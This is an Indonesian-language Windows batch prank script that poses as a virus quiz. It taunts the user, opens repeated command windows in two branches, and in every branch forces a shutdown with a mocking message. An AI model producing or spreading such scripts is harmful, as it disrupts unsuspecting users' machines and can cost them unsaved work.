@echo off
color e
echo =====================================
echo Apa yang kakak lakukan, jika komputer
echo kakak terkena virus? ( Jawab! )
echo =====================================
echo a) Format ulang
echo b) Menangis
echo c) Sevice aja
echo =====================================
set /p choise=Pilih :
cls
if %choise% == a goto format
if %choise% == b goto cengeng
if %choise% == c goto service

:format
color c
cls
echo =============================================
echo Ok, jadi kakak memilih "format ulang" ya?
echo Ok.. jadi sekarang sudah waktunya kakak 
echo untuk melakukan format ulang di laptop kakak!
echo =============================================
echo Hahahaha.... ucapkan selamat tinggal kepada
echo laptop mu naakkk...
echo =============================================
ping localhost -n 5 >nul
cls
shutdown -c "Hahaha... ucapkan selamat tinggal kepada perangkat mu nakk" -s

:cengeng
color c
cls
echo ========================================
echo Ok, jadi kakak memilih "Menangis" ya?
echo Ok, jadi sekarang kakak boleh menangis
echo karena laptop kakak sudah terkena virus!
echo ========================================
echo Hahaha... dasar cengeng wkwkwkwk....
echo ========================================
ping localhost -n 5 >nul
cls
start
start
start
start
start
start
start
start
start
start
shutdown -c "Hahaha... ucapkan selamat tinggal kepada perangkat mu nakk" -s

:service
color c
cls
echo =============================================
echo Ok, jadi kakak memilih "Service aja" ya?
echo Ok, jadi sekarang kakak boleh pergi ke
echo tempat service sekarang juga! karena komputer
echo kakak, sudah terkena oleh virus!!!
echo =============================================
echo Yaudah.. pergi sana!
echo =============================================
ping localhost -n 5 >nul
start
start
start
start
start
start
start
start
start
start
shutdown -c "Hahaha... ucapkan selamat tinggal kepada perangkat mu nakk" -s